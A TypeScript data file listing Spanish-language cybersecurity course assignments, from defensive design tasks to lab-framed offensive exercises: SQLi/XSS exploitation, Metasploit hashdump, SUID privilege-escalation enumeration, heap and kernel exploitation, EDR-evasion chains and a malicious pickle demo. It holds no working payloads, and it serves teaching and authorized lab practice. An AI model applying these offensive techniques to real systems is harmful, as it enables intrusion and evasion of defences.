import type { Homework } from "./types";

// Assignments. `tp` (type) controls the deliverable kind: research = essay,
// practical = build/test something, reflection = personal essay, code = source.
// The first 10 cubren Fundamentos→Programación básica; 11-18 cubren las
// categorías avanzadas (pentesting, AD, malware, forense, blue team, cloud).
export const HW: Homework[] = [
  { id: 1, l: 1, t: "Caso Real de Brecha", tp: "research", pts: 25, d: "Investiga Equifax 2017, SolarWinds 2020, o Colonial Pipeline 2021: vulnerabilidad, CIA violados, impacto, prevención." },
  { id: 2, l: 2, t: "Defensa en Profundidad", tp: "practical", pts: 30, d: "Como CISO de fintech: diseña 1+ control por capa. Justifica cada elección." },
  { id: 3, l: 3, t: "Superficie de Ataque Personal", tp: "reflection", pts: 20, d: "Lista tus dispositivos/cuentas. 5+ vectores de ataque con tipo, malware probable y protección." },
  { id: 4, l: 5, t: "Diagrama OSI Completo", tp: "practical", pts: 25, d: "Diagrama OSI: función, PDU, protocolos, dispositivos y 2+ ataques por capa." },
  { id: 5, l: 6, t: "Análisis de Protocolo", tp: "research", pts: 25, d: "Elige DNS, SMTP o FTP: funcionamiento paso a paso, puertos, vulnerabilidades y hardening." },
  { id: 6, l: 7, t: "Diseño de Red Segura", tp: "practical", pts: 30, d: "Red empresarial 200 empleados: subnetting, DMZ, segmentación, NAT, justificación." },
  { id: 7, l: 9, t: "Port Scanner en Python", tp: "code", pts: 35, d: "Escribe en Python: (1) port scanner con sockets, (2) ping sweep, (3) HTTP header grabber. Documenta código." },
  { id: 8, l: 10, t: "XSS Lab Report", tp: "practical", pts: 30, d: "Documenta 5 tipos de XSS: payload, contexto donde funciona, impacto y prevención." },
  { id: 9, l: 11, t: "SQLi Cheat Sheet", tp: "research", pts: 25, d: "Crea cheat sheet de SQLi: 15+ payloads organizados por tipo con explicación de cada uno." },
  { id: 10, l: 12, t: "Buffer Overflow Diagram", tp: "practical", pts: 30, d: "Dibuja el layout del stack. Explica paso a paso cómo un buffer overflow sobrescribe EIP y redirige ejecución." },
  { id: 11, l: 18, t: "Writeup de Ataque a AD", tp: "research", pts: 30, d: "Elige Kerberoasting o DCSync: explica paso a paso cómo funciona, qué herramientas se usan, qué evidencia deja (Event IDs) y cómo se defiende una organización." },
  { id: 12, l: 32, t: "CVSS Scoring", tp: "research", pts: 25, d: "Toma 5 CVEs reales de los últimos 2 años y calcula/verifica su CVSS v3.1, explicando cada métrica (AV, AC, PR, UI, S, C, I, A) y por qué priorizarías cada uno." },
  { id: 13, l: 40, t: "Reglas YARA", tp: "code", pts: 30, d: "Escribe 3 reglas YARA para detectar: (1) ransomware por extensión, (2) keylogger por strings, (3) backdoor por comportamiento de red. Documenta cada condición." },
  { id: 14, l: 45, t: "Análisis de PCAP", tp: "practical", pts: 35, d: "Analiza una captura de tráfico (lab/CTF): identifica el protocolo, extrae artefactos con NetworkMiner/Wireshark y documenta indicios de C2 (beaconing, DNS tunneling)." },
  { id: 15, l: 47, t: "IR Playbook de Ransomware", tp: "practical", pts: 35, d: "Crea un playbook de respuesta a incidentes para ransomware: detección, contención, erradicación, recuperación y comunicación (incluye notificación regulatoria)." },
  { id: 16, l: 51, t: "Hardening de un Dockerfile", tp: "code", pts: 30, d: "Toma un Dockerfile inseguro y endurécelo: usuario no-root, imagen mínima, sin secretos, drop capabilities. Escanéalo con Trivy y documenta los hallazgos." },
  { id: 17, l: 49, t: "Auditoría de Misconfigs AWS", tp: "practical", pts: 30, d: "Lista los 5 errores de configuración más comunes en AWS (S3 público, IAM excesivo, SG abiertos, etc.): cómo detectarlos, el riesgo y la remediación." },
  { id: 18, l: 54, t: "Reporte de Pentest Completo", tp: "practical", pts: 40, d: "Realiza una auditoría simulada end-to-end (recon→escaneo→enumeración→explotación) en un lab legal y entrega un reporte profesional con resumen ejecutivo, hallazgos por severidad y remediación." },
  { id: 19, l: 4, t: "Comparativa de frameworks de seguridad", tp: "research", pts: 30, d: "Crea una tabla comparativa entre NIST CSF, ISO 27001, OWASP Top 10 y PCI-DSS cubriendo: alcance, si es certificable, audiencia objetivo y caso de uso ideal. Explica en qué escenario aplicarías cada uno." },
  { id: 20, l: 8, t: "Investigación forense de captura PCAP", tp: "practical", pts: 35, d: "Captura 5 minutos de tu tráfico de red con Wireshark. Identifica los 3 protocolos más usados, detecta posible tráfico en texto plano (HTTP/DNS) y documenta cualquier conexión sospechosa. Usa filtros y explícalos." },
  { id: 21, l: 13, t: "Auditoría de seguridad WiFi", tp: "practical", pts: 30, d: "Audita tu propia red WiFi (con permiso): identifica el protocolo de cifrado en uso (WEP/WPA2/WPA3), evalúa la fortaleza de la contraseña y revisa si WPS está activo. Propón un plan de hardening con al menos 5 mejoras concretas." },
  { id: 22, l: 14, t: "Exploración del filesystem y procesos en Linux", tp: "practical", pts: 25, d: "En una máquina/VM Linux, documenta el propósito de 6 directorios clave (/etc, /var, /home, /bin, /tmp, /proc). Lista los 5 procesos que más recursos consumen con ps/top y explica qué hacen. Adjunta la salida de los comandos." },
  { id: 23, l: 15, t: "Script de monitoreo de seguridad en Bash", tp: "code", pts: 35, d: "Escribe un script Bash que: detecte intentos fallidos de login en /var/log/auth.log, liste usuarios con UID 0, muestre puertos en escucha y reporte archivos con permiso 777. Usa funciones, variables y manejo de argumentos. Incluye shebang y comentarios." },
  { id: 24, l: 16, t: "Hardening de permisos y SUID", tp: "practical", pts: 35, d: "En una VM Linux, encuentra todos los binarios SUID con 'find / -perm -4000 2>/dev/null' y analiza cuáles son riesgosos. Revisa /etc/sudoers, verifica el estado de SELinux/AppArmor y aplica 4 controles de un CIS Benchmark. Documenta cada paso." },
  { id: 25, l: 17, t: "Auditoría de hardening de Windows", tp: "practical", pts: 30, d: "En una VM de Windows, documenta tres claves del registro usadas para persistencia (Run, RunOnce, Winlogon), revisa el Event Viewer filtrando los Event ID 4624/4625/4688, y aplica una GPO local que deshabilite SMBv1. Adjunta capturas y explica el riesgo mitigado." },
  { id: 26, l: 19, t: "Script de auditoría en PowerShell", tp: "code", pts: 35, d: "Escribe un script de PowerShell que liste los servicios en ejecución cuyo ejecutable esté fuera de C:\\Windows, recupere los últimos 20 eventos de seguridad con Get-WinEvent y exporte el resultado a un CSV. Incluye manejo de errores y comentarios explicando cada bloque." },
  { id: 27, l: 20, t: "Comparación de modos AES", tp: "code", pts: 30, d: "Implementa en el lenguaje que prefieras el cifrado de una misma imagen con AES en modo ECB y en modo CBC. Compara visualmente los resultados, explica por qué ECB filtra patrones y justifica cuándo usarías GCM en lugar de CBC por su autenticación integrada." },
  { id: 28, l: 21, t: "Generación y uso de pares de claves", tp: "practical", pts: 30, d: "Usando OpenSSL, genera un par de claves RSA de 2048 bits y otro ECC (curva prime256v1). Cifra un mensaje con la clave pública RSA y descífralo con la privada, luego firma un archivo con ECC y verifica la firma. Compara los tamaños de clave y documenta los comandos usados." },
  { id: 29, l: 22, t: "Hashing de contraseñas y verificación de certificados", tp: "practical", pts: 30, d: "Genera el hash de una contraseña con bcrypt y con argon2, comparando sus parámetros de coste. Luego, con OpenSSL inspecciona el certificado X.509 de un sitio HTTPS (openssl s_client) y verifica su cadena hasta la CA raíz. Explica por qué SHA-256 sirve para integridad pero no para almacenar contraseñas." },
  { id: 30, l: 23, t: "Análisis de un handshake TLS", tp: "research", pts: 35, d: "Captura con Wireshark un handshake TLS 1.3 hacia un sitio HTTPS y describe cada mensaje (ClientHello, ServerHello, certificado, Finished). Identifica la cipher suite negociada, explica cómo se logra Forward Secrecy con ECDHE y compara brevemente IPsec con WireGuard como soluciones VPN." },
  { id: 31, l: 24, t: "Configuración de cookies y CSP", tp: "practical", pts: 30, d: "Sobre una app web de prueba, configura una cookie de sesión con los atributos HttpOnly, Secure y SameSite=Lax y verifica con DevTools que no es accesible desde document.cookie. Luego define una cabecera Content-Security-Policy restrictiva y documenta qué inyección de script bloquea." },
  { id: 32, l: 25, t: "Investigación del OWASP Top 10 (1)", tp: "research", pts: 25, d: "Investiga las primeras cinco categorías del OWASP Top 10 2021 y, para cada una, redacta un caso real (CVE o brecha pública) que la ilustre, su impacto y la mitigación recomendada. Cita las fuentes y enlaza al cheat sheet de OWASP correspondiente." },
  { id: 33, l: 26, t: "Investigación del OWASP Top 10 (2)", tp: "research", pts: 25, d: "Investiga las categorías A06 a A10 del OWASP Top 10 2021. Para SSRF, describe cómo se explota el endpoint de metadata de un proveedor cloud y para Logging Failures explica qué eventos mínimos deberían registrarse. Cita fuentes y propón controles concretos para cada categoría." },
  { id: 34, l: 27, t: "Explotación de SQLi y XSS en DVWA", tp: "practical", pts: 40, d: "En DVWA u otro laboratorio autorizado, explota una SQL Injection union-based para extraer credenciales y un XSS reflejado que muestre un alert con la cookie. Luego corrige ambos: reescribe la consulta con prepared statements y aplica output encoding. Documenta el antes y después con capturas." },
  { id: 35, l: 28, t: "Pruebas de CSRF y SSRF", tp: "practical", pts: 35, d: "En un laboratorio autorizado, construye una página HTML que dispare una petición CSRF contra una acción sin token y demuestra el cambio de estado. Después, prueba un parámetro vulnerable a SSRF intentando acceder a un recurso interno. Implementa un token anti-CSRF y una allowlist de URLs como remediación." },
  { id: 36, l: 29, t: "Perfil OSINT de un objetivo autorizado", tp: "research", pts: 30, d: "Elige un dominio para el que tengas permiso (o el tuyo propio) y elabora un informe OSINT pasivo usando WHOIS, certificados (crt.sh), Shodan y Google Dorking. Lista subdominios, tecnologías expuestas y posibles fugas de información, distinguiendo claramente qué fue reconocimiento pasivo frente a activo." },
  { id: 37, l: 30, t: "Escaneo Nmap documentado", tp: "practical", pts: 30, d: "Contra una máquina autorizada (p. ej. scanme.nmap.org o tu laboratorio), ejecuta un escaneo SYN con detección de versión y SO (-sS -sV -O), un escaneo con scripts (-sC) y un escaneo UDP de los puertos comunes. Documenta los comandos, interpreta los puertos abiertos y explica el impacto del timing/-T en la detección." },
  { id: 38, l: 31, t: "Enumeración de SMB, SNMP y DNS", tp: "practical", pts: 35, d: "En un laboratorio autorizado, enumera shares y usuarios SMB con enum4linux, vuelca la MIB de un dispositivo con snmpwalk usando la community 'public' e intenta una transferencia de zona DNS (AXFR) con dig. Documenta los hallazgos y explica qué configuración del servidor permitió cada fuga." },
  { id: 39, l: 33, t: "Flujo de explotación con Metasploit", tp: "practical", pts: 40, d: "En un laboratorio autorizado (Metasploitable o VM vulnerable), usa Metasploit para identificar un servicio vulnerable con un módulo auxiliary, configura un exploit con un payload meterpreter y obtén una sesión. Realiza una acción post-explotación (hashdump) y documenta cada paso, opciones (RHOSTS, LHOST) y la mitigación del vector usado." },
  { id: 40, l: 34, t: "Interceptar y manipular con Burp", tp: "practical", pts: 30, d: "Configura Burp Suite Community como proxy de tu navegador, intercepta una petición de login de una app de prueba (DVWA o juice-shop local), envíala a Repeater, modifica un parámetro y documenta con capturas cómo cambia la respuesta del servidor." },
  { id: 41, l: 35, t: "Enumerar PrivEsc en Linux", tp: "practical", pts: 35, d: "En una máquina Linux de laboratorio (TryHackMe o VM local), enumera binarios SUID con 'find / -perm -4000', identifica al menos uno abusable según GTFOBins y documenta paso a paso cómo lo usarías para escalar a root. Incluye los comandos exactos." },
  { id: 42, l: 36, t: "Detectar rutas de servicio vulnerables", tp: "practical", pts: 35, d: "En una VM Windows de prueba, usa WinPEAS o consultas WMIC para enumerar servicios con unquoted service paths y permisos débiles. Documenta cada hallazgo, explica por qué es explotable y propone la mitigación correspondiente." },
  { id: 43, l: 37, t: "Montar un pivote con SOCKS", tp: "practical", pts: 35, d: "En un laboratorio con dos redes, establece un túnel SOCKS (con ssh -D o chisel) desde un host comprometido, configura proxychains para alcanzar la red interna y documenta cómo enumeras un servicio que antes era inalcanzable. Incluye archivos de configuración." },
  { id: 44, l: 38, t: "Analizar un caso de ingeniería social", tp: "reflection", pts: 25, d: "Investiga un ataque real de ingeniería social documentado (ej. Twitter 2020, RSA 2011) y redacta un análisis de 400-500 palabras identificando qué principios psicológicos (autoridad, urgencia, reciprocidad, etc.) se explotaron y qué controles lo habrían prevenido." },
  { id: 45, l: 39, t: "Diseñar una plantilla anti-phishing", tp: "research", pts: 30, d: "Investiga las técnicas de evasión usadas en spear phishing y BEC. Construye una checklist de 10 señales de alerta para que un empleado identifique un correo malicioso, justificando cada ítem con la técnica de ataque concreta que detecta." },
  { id: 46, l: 41, t: "Triage estático de una muestra", tp: "practical", pts: 35, d: "Sobre una muestra benigna o de laboratorio (ej. un EXE de prueba), calcula su hash SHA256, ejecuta 'strings' para extraer indicadores, inspecciona las cabeceras PE y la tabla de imports con PEStudio o pefile, y determina si está empaquetada. Documenta todos los hallazgos." },
  { id: 47, l: 42, t: "Detonar malware en sandbox", tp: "practical", pts: 35, d: "Sube una muestra de laboratorio a una sandbox pública (ANY.RUN o Joe Sandbox) o usa una VM aislada con Procmon. Documenta el comportamiento observado: procesos creados, claves de registro modificadas, conexiones de red al C2 y archivos generados." },
  { id: 48, l: 43, t: "Redactar un acta de cadena de custodia", tp: "practical", pts: 25, d: "Elabora un documento formal de cadena de custodia para un escenario simulado de incautación de un laptop. Incluye identificación de la evidencia, hashes de integridad, orden de volatilidad seguido en la adquisición y registro de cada transferencia con fecha, hora y responsable." },
  { id: 49, l: 44, t: "Analizar un volcado de memoria", tp: "practical", pts: 40, d: "Descarga un memory dump de práctica (ej. de los retos de Volatility) y usa Volatility para listar procesos (pslist), conexiones de red (netscan) y procesos ocultos (psxview). Documenta los indicadores sospechosos que encuentres y construye una hipótesis del incidente." },
  { id: 50, l: 46, t: "Escribir una regla de correlación SIEM", tp: "code", pts: 35, d: "Escribe una consulta SPL de Splunk (o KQL/ELK equivalente) que correlacione múltiples fallos de login seguidos de un login exitoso desde la misma IP para detectar fuerza bruta. Explica cada cláusula y define el umbral de alerta." },
  { id: 51, l: 48, t: "Aplicar la Pyramid of Pain", tp: "research", pts: 30, d: "Toma un informe de threat intel público (ej. de un APT) y clasifica sus indicadores en los niveles de la Pyramid of Pain. Diferencia IoC de IoA, formula al menos 2 hipótesis de threat hunting basadas en TTPs y explica por qué cazar TTPs es más efectivo." },
  { id: 52, l: 50, t: "Auditoría de identidades en la nube", tp: "research", pts: 30, d: "Investiga y documenta las diferencias entre Managed Identities de Azure y Service Accounts de GCP. Explica al menos 3 vectores de escalada de privilegios vía managed identities mal configuradas (p.ej. abuso de IMDS) y propone controles de detección con Entra ID Conditional Access y GCP IAM Recommender." },
  { id: 53, l: 52, t: "Pipeline CI/CD seguro", tp: "code", pts: 35, d: "Crea un pipeline (GitHub Actions o GitLab CI) que integre una etapa SAST, una DAST contra una app vulnerable, generación de SBOM con CycloneDX y secrets scanning. Configura que el build falle ante hallazgos críticos y entrega el YAML del pipeline." },
  { id: 54, l: 53, t: "Análisis de firmware IoT", tp: "practical", pts: 35, d: "Toma una imagen de firmware (de un router o dispositivo IoT) y extráela con binwalk. Identifica binarios, credenciales hardcodeadas y claves embebidas. Mapea tus hallazgos contra al menos 5 controles del OWASP MASVS o IoT Top 10 y documenta los riesgos." },
  { id: 55, l: 55, t: "Herramienta ofensiva en Python", tp: "code", pts: 35, d: "Desarrolla un scanner de puertos asíncrono con asyncio capaz de manejar miles de conexiones concurrentes, y un módulo aparte que use ctypes para llamar una función de una librería C nativa. Bonus: un script de Frida que hookee una función en un proceso de prueba. Entrega el código comentado." },
  { id: 56, l: 56, t: "Tooling de seguridad en Go", tp: "code", pts: 30, d: "Implementa en Go una herramienta de red concurrente (p.ej. un brute-forcer o scanner) usando goroutines y channels con un worker pool limitado. Compílala estáticamente y cross-compílala para Windows y Linux. Documenta el uso de channels para sincronización segura." },
  { id: 57, l: 57, t: "Módulo auxiliar de Metasploit", tp: "code", pts: 35, d: "Escribe un módulo auxiliar de Metasploit en Ruby que realice enumeración o fuzzing contra un servicio (HTTP/TCP), usando el mixin apropiado, datastore options y metadata correcta. Pruébalo en msfconsole contra un objetivo de lab y entrega el .rb." },
  { id: 58, l: 58, t: "Lab de XSS y clickjacking", tp: "practical", pts: 30, d: "Construye una página vulnerable a DOM-based XSS y a clickjacking, demuestra ambos ataques, y luego remédialos: aplica una Content Security Policy estricta, sanitiza el DOM con DOMPurify y añade frame-ancestors. Documenta payloads y mitigaciones con capturas." },
  { id: 59, l: 59, t: "Explotación de UAF en heap glibc", tp: "practical", pts: 40, d: "En un binario de práctica con un use-after-free, realiza tcache poisoning para conseguir un write arbitrario y secuestra el flujo de control (p.ej. sobrescribiendo __free_hook o una entrada GOT). Documenta el layout del heap con pwndbg y el exploit en pwntools." },
  { id: 60, l: 60, t: "Privesc en kernel Linux", tp: "practical", pts: 40, d: "En un módulo de kernel vulnerable de lab (p.ej. de kernel CTF), explota un overflow o UAF para escalar a root. Explica cómo bypaseas SMEP/SMAP (ret2dir o ROP en kernel) y ejecuta commit_creds(prepare_kernel_cred(0)). Documenta la cadena completa." },
  { id: 61, l: 61, t: "Análisis de bug de motor JS", tp: "research", pts: 40, d: "Estudia un bug público de type confusion en V8 o JavaScriptCore (con su CVE) y documenta cómo el optimizador JIT introdujo la vulnerabilidad, cómo se construyen las primitivas addrof/fakeobj y arbitrary R/W, y qué se necesita adicionalmente para escapar del sandbox del renderer." },
  { id: 62, l: 62, t: "Cadena ROP con bypass de mitigaciones", tp: "practical", pts: 40, d: "En un binario con NX y ASLR (sin PIE o con leak), construye una cadena ROP que use un info leak para derrotar ASLR y llame a system/execve. Documenta cómo localizaste gadgets (ROPgadget/ropper) y discute cómo CFI o JOP-mitigations afectarían tu enfoque. Entrega el exploit en pwntools." },
  { id: 63, l: 63, t: "Ataque de padding oracle", tp: "code", pts: 35, d: "Implementa desde cero un ataque de padding oracle contra un servicio CBC vulnerable de lab, descifrando un ciphertext sin conocer la clave. Documenta la lógica byte a byte del ataque. Adicionalmente, resume conceptualmente la diferencia entre criptoanálisis diferencial y lineal con un ejemplo." },
  { id: 64, l: 64, t: "Migración a criptografía post-cuántica", tp: "research", pts: 35, d: "Investiga el impacto de los algoritmos de Shor y Grover sobre RSA, ECC y AES. Documenta el funcionamiento de ML-KEM (Kyber) y ML-DSA (Dilithium) y diseña un plan de migración híbrida (clásico+PQC) para una aplicación TLS, justificando las decisiones criptoágiles." },
  { id: 65, l: 65, t: "Prototipo de ZKP o secret sharing", tp: "code", pts: 35, d: "Implementa Shamir's Secret Sharing (split y recuperación con umbral t-de-n) en el lenguaje de tu elección, o construye un circuito zk-SNARK simple con Circom/snarkjs que pruebe el conocimiento de un preimagen de hash sin revelarlo. Documenta las propiedades de zero-knowledge y soundness." },
  { id: 66, l: 66, t: "Cómputo sobre datos cifrados con FHE", tp: "code", pts: 40, d: "Usando una librería FHE (Microsoft SEAL, OpenFHE o tenSEAL), implementa un cómputo homomórfico: con BFV evalúa una operación aritmética exacta sobre enteros cifrados, o con CKKS realiza una inferencia aproximada sobre datos cifrados. Documenta el crecimiento del ruido y cuándo sería necesario bootstrapping." },
  { id: 67, l: 67, t: "Genera adversariales con FGSM y PGD", tp: "code", pts: 35, d: "Entrena un clasificador simple sobre MNIST o CIFAR-10 y implementa FGSM y PGD desde cero. Mide la caída de accuracy en función de epsilon, grafica la curva y discute por qué PGD (multi-paso con proyección) es más efectivo que FGSM (un paso) para el mismo presupuesto de perturbación." },
  { id: 68, l: 68, t: "Ataque de membership inference + defensa DP", tp: "code", pts: 38, d: "Implementa un ataque de membership inference de tipo shadow-model contra un modelo objetivo y reporta la AUC del atacante. Luego reentrena el objetivo con DP-SGD a distintos epsilon y demuestra empíricamente el trade-off entre privacidad (epsilon) y utilidad (accuracy). Entrega tablas y conclusiones." },
  { id: 69, l: 69, t: "Banco de pruebas de prompt injection", tp: "practical", pts: 35, d: "Construye una mini-app RAG con un LLM y diseña al menos 8 payloads de prompt injection directa e indirecta (vía documento recuperado) mapeados al OWASP LLM Top 10. Documenta cuáles tienen éxito, propón mitigaciones (delimitadores, sanitización de salida, segregación de privilegios) y vuelve a probar." },
  { id: 70, l: 70, t: "Detección de pickle malicioso en modelos", tp: "code", pts: 33, d: "Crea un modelo .pkl que ejecute un payload benigno (ej. escribir un archivo) vía __reduce__ al deserializar para demostrar el riesgo. Luego escribe un escáner que inspeccione el opcode stream con pickletools sin ejecutar el objeto, y compara la seguridad de convertir el artefacto a safetensors. Reporta hallazgos." },
  { id: 71, l: 71, t: "Reproduce un canal lateral Flush+Reload", tp: "practical", pts: 38, d: "Implementa un covert channel o un side-channel Flush+Reload en C sobre una caché compartida, midiendo la diferencia de latencia entre hit y miss con rdtsc. Recolecta el histograma de tiempos, determina el umbral de clasificación y explica cómo Spectre encadena este primitivo con ejecución especulativa." },
  { id: 72, l: 72, t: "Diseño de un ataque de glitching", tp: "research", pts: 32, d: "Investiga y documenta un ataque real de fault injection sobre un microcontrolador (ej. bypass de Secure Boot por voltage o clock glitching). Describe el setup de hardware, el parámetro temporal del glitch, qué instrucción se salta y por qué, y enumera contramedidas a nivel de silicio y firmware (redundancia, detección de glitch, doble verificación)." },
  { id: 73, l: 73, t: "Auditoría de la cadena de Secure Boot", tp: "research", pts: 34, d: "Analiza la cadena de confianza UEFI de una plataforma: desde el Hardware Root of Trust hasta el bootloader del OS. Diagrama las fases (SEC, PEI, DXE, BDS), explica dónde encajan Secure Boot (verificación de firmas) y Measured Boot (extensión de PCRs), e identifica al menos dos clases de ataque históricas (ej. variables NVRAM, LogoFAIL/parsing de imágenes) y sus parches." },
  { id: 74, l: 74, t: "Esquema de attestation con TPM", tp: "research", pts: 33, d: "Diseña en papel un flujo de remote attestation basado en TPM 2.0: explica el uso de PCRs, la AK/EK, el quote firmado y el nonce anti-replay del verificador. Compara las garantías y la TCB de TPM vs SGX vs ARM TrustZone, y discute en qué escenario elegirías cada raíz de confianza." },
  { id: 75, l: 75, t: "Reversea un binario con anti-debug", tp: "practical", pts: 36, d: "Toma un crackme o binario con protecciones (anti-debug, packing u ofuscación) y analízalo con Ghidra o IDA. Documenta las técnicas anti-análisis detectadas (ej. IsDebuggerPresent, timing checks, control-flow flattening), cómo las neutralizaste y recupera la lógica clave. Entrega capturas y un writeup paso a paso." },
  { id: 76, l: 76, t: "Resuelve un reto con ejecución simbólica", tp: "code", pts: 35, d: "Usa angr (o KLEE) para encontrar la entrada que satisface una rama objetivo en un binario de validación de licencia/flag. Modela los símbolos, define el estado objetivo y el evitado, y resuelve con el solver SMT. Documenta el problema de path explosion que encontraste y qué técnica (ej. veritesting, hooks de funciones) usaste para mitigarlo." },
  { id: 77, l: 77, t: "Análisis de técnicas de rootkit DKOM", tp: "research", pts: 34, d: "Investiga la técnica DKOM de ocultamiento de procesos en Windows o Linux: explica qué estructura del kernel se manipula (EPROCESS/ActiveProcessLinks o task_struct), cómo el rootkit se desvincula de la lista del scheduler y por qué sigue ejecutándose. Compara DKOM con SSDT/inline hooking y describe estrategias de detección forense de memoria." },
  { id: 78, l: 78, t: "Análisis de cadena de evasión de EDR", tp: "research", pts: 36, d: "Documenta una cadena moderna de evasión de EDR: AMSI bypass, unhooking de ntdll y direct/indirect syscalls. Explica a nivel técnico por qué cada paso derrota un mecanismo concreto del EDR (user-land hooks, ETW, escaneo AMSI), y propón controles defensivos (kernel callbacks, ETW-Ti, ELAM) que el defensor puede activar para volver a tener visibilidad." },
  { id: 79, l: 79, t: "Campaña de fuzzing con triage de crashes", tp: "practical", pts: 38, d: "Elige una biblioteca de parsing en C/C++, escribe un harness para AFL++ o libFuzzer, compila con AddressSanitizer y ejecuta una campaña con un corpus inicial. Recolecta los crashes, minimízalos, deduplica por stack hash y haz triage de al menos uno determinando si es explotable (tipo de bug, control de offset, severidad). Entrega el informe de triage." },
  { id: 80, l: 80, t: "Perfil de una APT con Diamond Model", tp: "research", pts: 32, d: "Selecciona un grupo APT documentado públicamente y construye su perfil usando el Diamond Model (adversario, capacidad, infraestructura, víctima) y mapea sus TTPs a MITRE ATT&CK. Discute críticamente la fiabilidad de la atribución, los riesgos de false-flag, y ubica los indicadores observados en la Pyramid of Pain." },
  { id: 81, l: 81, t: "Plan de responsible disclosure", tp: "reflection", pts: 30, d: "Redacta un plan de coordinated disclosure para una vulnerabilidad hipotética que encontraste: incluye el reporte técnico con PoC reproducible, el cálculo de severidad CVSS justificado vector a vector, la línea de tiempo propuesta con el proveedor, el manejo del CVE, y una reflexión ética sobre coordinated vs full disclosure y los plazos de embargo." },
  { id: 82, l: 82, t: "Especifica un protocolo en TLA+", tp: "code", pts: 35, d: "Modela un algoritmo concurrente sencillo (ej. exclusión mutua o un buffer acotado) en TLA+/PlusCal. Define al menos una propiedad de safety (invariante) y una de liveness (eventualmente), corre el model checker TLC para verificarlas y, si encuentra un contraejemplo, analiza la traza de error y corrige la especificación. Entrega el módulo y los resultados de TLC." },
  { id: 83, l: 83, t: "Diseño de IAM para una pyme", tp: "practical", pts: 30, d: "Diseña el modelo IAM de una empresa de 100 personas: política de MFA (qué factores), SSO/federación, un esquema RBAC con 5 roles y sus permisos, gestión de cuentas privilegiadas (PAM) y el proceso de altas/bajas (joiner-mover-leaver). Justifica cada decisión." },
  { id: 84, l: 84, t: "Rediseño a Zero Trust", tp: "practical", pts: 35, d: "Toma una arquitectura de perímetro clásica (firewall + red interna 'confiable') y rediséñala hacia Zero Trust: identifica los activos, define PDP/PEP, microsegmentación, verificación de dispositivo e identidad por petición, y un modelo de amenazas STRIDE del nuevo diseño. Entrega un diagrama y la justificación." },
  { id: 85, l: 85, t: "Análisis de riesgos de un activo", tp: "research", pts: 30, d: "Elige un activo crítico (base de datos de clientes, servidor web, etc.) y realiza un análisis de riesgos con ISO 27005 o MAGERIT: lista amenazas y vulnerabilidades, valora probabilidad e impacto, calcula el nivel de riesgo, propón el tratamiento (mitigar/transferir/evitar/aceptar) y el riesgo residual esperado." },
  { id: 86, l: 86, t: "Mapa de cumplimiento de una SaaS", tp: "research", pts: 30, d: "Para una empresa SaaS ficticia que maneja datos personales y pagos, determina qué marcos le aplican (RGPD, PCI-DSS, SOC 2…) y por qué. Para uno de ellos, lista 8 controles concretos que debería implementar y qué evidencia presentaría en una auditoría para demostrarlos." },
  { id: 87, l: 83, t: "Matriz de los 5 factores de autenticación", tp: "research", pts: 25, d: "Construye una matriz con los 5 factores modernos (conocimiento, posesión, inherencia, ubicación, comportamiento). Para cada uno: (a) 3 mecanismos concretos usados en la industria, (b) su resistencia relativa al phishing y a la reutilización, (c) un caso real (brecha o incidente público) donde ese factor falló y por qué. Cierra con una recomendación argumentada de qué combinación exigirías para un login normal vs. para acceso a la consola de admin de un sistema crítico." },
  { id: 88, l: 83, t: "Migración a passkeys / FIDO2", tp: "practical", pts: 35, d: "Diseña el plan de migración de una empresa de 500 personas desde contraseña + SMS OTP hacia passkeys FIDO2 como MFA primaria. Incluye: (1) inventario de aplicaciones (SSO federado vs legacy), (2) estrategia de enrollment (sync passkey vs device-bound YubiKey para admins), (3) política de attestation y aceptación de autenticadores, (4) recuperación / bootstrap para usuarios que pierden el dispositivo, (5) fases de rollout y kill-switch de SMS, y (6) métricas de éxito. Explicita cómo la migración cierra el vector AiTM." },
  { id: 89, l: 83, t: "Política de autenticación adaptativa", tp: "practical", pts: 30, d: "Escribe una política de autenticación adaptativa (Conditional Access de Entra o Okta Risk Engine) con al menos 6 reglas concretas. Cada regla debe incluir: condición (usuario/dispositivo/red/hora/recurso/threat signal), acción (allow / step-up con qué factor / block), justificación de negocio y el falso positivo esperado. Incluye una regla que use *impossible travel*, una que endurezca el acceso a un recurso privilegiado, y una que bloquee si aparecen credenciales filtradas en un dump conocido." },
  { id: 90, l: 83, t: "Threat model de una app passwordless", tp: "research", pts: 30, d: "Aplica STRIDE a un flujo de login passwordless con magic link como fallback (además del passkey primario). Identifica al menos 8 amenazas distribuidas entre las 6 categorías de STRIDE, valorando la severidad de cada una. Presta especial atención al **downgrade path**: qué pasa si el atacante fuerza al usuario al fallback. Propón controles compensatorios (rate limit, señales de riesgo, revocación) para cada amenaza que no se pueda eliminar con el diseño." },
  { id: 91, l: 83, t: "Post-mortem de una brecha por AiTM o MFA fatigue", tp: "research", pts: 30, d: "Elige un caso real: Uber 2022 (MFA fatigue), Cisco 2022 (fatigue + vishing), Reddit 2023 (AiTM phishing), Twilio 2022 (smishing + SIM swap) o similar. Escribe un post-mortem con: (1) línea de tiempo del ataque, (2) el vector técnico exacto que rompió la MFA, (3) qué controles fallaron o faltaron, (4) qué habría cortado la cadena (FIDO2, number matching, IAM adaptativa, PAM, consent governance), y (5) 5 lecciones concretas para tu organización con dueño y KPI de cada una." },
  { id: 92, l: 49, t: "Auditoría fleet-wide de IMDSv2 en AWS", tp: "practical", pts: 30, d: "En una cuenta AWS (lab o real con permiso), enumera todas las EC2 con `aws ec2 describe-instances --query 'Reservations[].Instances[].{Id:InstanceId,Http:MetadataOptions.HttpTokens,HopLimit:MetadataOptions.HttpPutResponseHopLimit}'`. Identifica cuáles siguen con IMDSv1 (HttpTokens=optional) y cuáles tienen hop-limit >1 (riesgo para contenedores). Escribe un SCP que fuerce IMDSv2 obligatorio en nuevas EC2 y un plan de migración de las existentes sin downtime. Incluye el CloudTrail event a monitorear para detectar cambios manuales." },
  { id: 93, l: 49, t: "Diseño de SCPs para una AWS Organization", tp: "practical", pts: 35, d: "Diseña el set de SCPs para una organización AWS con 3 OUs (Sandbox / Dev / Prod). Requisitos: (a) prohibir uso de la root account para operaciones diarias, (b) limitar regiones a us-east-1 y eu-west-1, (c) forzar IMDSv2 en toda EC2 nueva, (d) vetar `iam:CreateUser` y `iam:CreateAccessKey` para forzar SSO en Dev/Prod, (e) impedir que roles asumidos desde fuera de la Org toquen S3 (via `aws:PrincipalOrgID`). Entrega los 5 SCPs en JSON + el order de attachment por OU + una prueba en `describe-effective-policy`." },
